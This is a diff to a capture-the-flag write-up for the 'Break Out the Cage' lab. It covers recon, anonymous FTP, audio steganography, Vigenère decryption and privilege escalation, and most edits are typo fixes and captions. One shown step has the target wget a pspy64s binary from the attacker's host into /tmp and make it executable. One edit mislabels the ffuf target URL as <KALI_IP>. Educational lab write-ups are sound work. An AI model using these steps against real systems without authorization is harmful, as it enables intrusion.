@@ -43,7 +43,7 @@ PORT   STATE SERVICE VERSION
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to ::ffff:<YOUR_IP>
+|      Connected to ::ffff:<KALI_IP>
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -91,7 +91,7 @@ ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://<TARGET_IP>/FUZZ
+ :: URL              : http://<KALI_IP>/FUZZ
  :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -117,7 +117,7 @@ Found an `/auditions` directory containing an MP3 file.
 ## 2. FTP — Anonymous Login
 
 ```bash
-FTP <TARGET_IP>
+ftp <TARGET_IP>
 Connected to <TARGET_IP>.
 220 (vsFTPd 3.0.3)
 Name (...): anonymous
@@ -153,6 +153,7 @@ The output was Vigenère ciphertext — not yet readable without a key.
 
 ![Deciphered text of dad_tasks file](/assets/images/writeups/break-out-the-cage/Decoded.png)
 
+*The deciphered data from the dad_taks file*
 ---
 
 ## 3. Audio Steganography — Finding the Key
@@ -167,7 +168,7 @@ Opened it in Audacity and switched the track to **Spectrogram view** (click the 
 
 ![Spectrogram showing the key](/assets/images/writeups/break-out-the-cage/Audacity.png)
 
-**Key found: `namelesstwo`**
+* The key `namelesstwo` becomes visible in Audacity's spectrogram view *
 
 This is a classic steganography technique — data encoded visually into the frequency spectrum of an audio file, invisible to the human ear but visible as shapes when rendered as a spectrogram.
 
@@ -176,6 +177,10 @@ This is a classic steganography technique — data encoded visually into the fre
 ## 4. Vigenère Decryption — Round 1
 
 With the key `namelesstwo`, decrypted the ciphertext from the FTP file using [dcode.fr/vigenere-cipher](https://www.dcode.fr/vigenere-cipher).
+
+![Spectrogram showing the key](/assets/images/writeups/break-out-the-cage/Cipher#1.png)
+
+* Acquire the data needed, utilising the decoded `dad_tasks` file and `namelesstwo` into the vigerener-cipher *
 
 This revealed the deciphered data, where westons password resides.
 
@@ -228,7 +233,7 @@ id
 ```
 
 
-Refering back to the book "Linux Basics for Hackers by OccupyTheWeb". The group leader is always associated with the '1000' uid — Spectating the user id, we discover weston is apart of the `cage` group.  
+Refering back to the book "Linux Basics for Hackers by OccupyTheWeb". The group leader is always associated with the '1000' uid — Examining the output of id, we discover weston is a member of the `cage` group.  
 
 Now utilising the pspy64s payload will allow us to monitor running processes without root privileges. It lets you spy on what commands other users (including root) are executing.
 
@@ -239,13 +244,15 @@ After downloading the payload, follow this to upload it to the target machine an
 python3 -m http.server
 
 # Target (weston) terminal
-wget http://<Your IP>:8000/pspy64s -O /tmp/pspy64s
+wget http://<KALI_IP>:8000/pspy64s -O /tmp/pspy64s
 chmod +x /tmp/pspy64s
 ```
-Now on the previous VM I completed, I had issues granting executing permissions to the pspy payload, due to my remote system not having write permissions. To bypass this issue — /tmp is world-writable, therefore downloading the payload to the /tmp directory completely disregards such uneccesary headache.     
+Now on the previous VM I completed, I had issues granting executing permissions to the pspy payload, due to my remote system not having write permissions. To bypass this issue — /tmp is world-writable, therefore downloading the payload to the /tmp directory completely disregards such unnecessary headache.     
 
 ![Executing the pspy64s Payload](/assets/images/writeups/break-out-the-cage/PSPY64S.png)
 
+* Now we can inspect the running processes without root privileges *
+  
 Viewing the processes, you'll come across
 ```
 /opt/.dads_scripts/.files/.quotes
@@ -329,7 +336,9 @@ haiinspsyanileph
 
 The email heavily hinted at the key — the word **"face"** was emphasised repeatedly.
 
-Decrypted using Vigenère with key `face` → revealed root's password.
+![Spectrogram showing the key](/assets/images/writeups/break-out-the-cage/Cipher#2.png)
+
+* Decrypted `haiinspsyanileph` using Vigenère with key `face` → revealed root's password *
 
 
 
@@ -345,7 +354,7 @@ su root
 The flag wasn't in `/root/root.txt` — it was in root's mail:
 
 ```bash
-cat /root/email_backup/email_1 OR email_2
+cat /root/email_backup/email_2
 ```
 
 ---
